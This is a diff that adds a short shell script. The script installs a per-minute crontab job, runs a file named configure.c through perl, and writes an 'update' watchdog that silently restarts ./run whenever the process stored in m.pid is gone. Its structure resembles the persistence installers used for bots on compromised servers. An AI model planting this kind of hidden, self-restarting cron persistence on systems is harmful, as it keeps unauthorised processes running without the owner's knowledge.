@@ -1,0 +1,18 @@
+#!/bin/sh
+pwd > mech.dir
+dir=$(cat mech.dir)
+echo "* * * * * $dir/update >/dev/null 2>&1" > cron.d
+crontab cron.d
+crontab -l | grep update
+perl configure.c
+echo "#!/bin/sh
+if test -r $dir/m.pid; then
+pid=\$(cat $dir/m.pid)
+if \$(kill -CHLD \$pid >/dev/null 2>&1)
+then
+exit 0
+fi
+fi
+cd $dir
+./run &>/dev/null" > update
+chmod u+x update
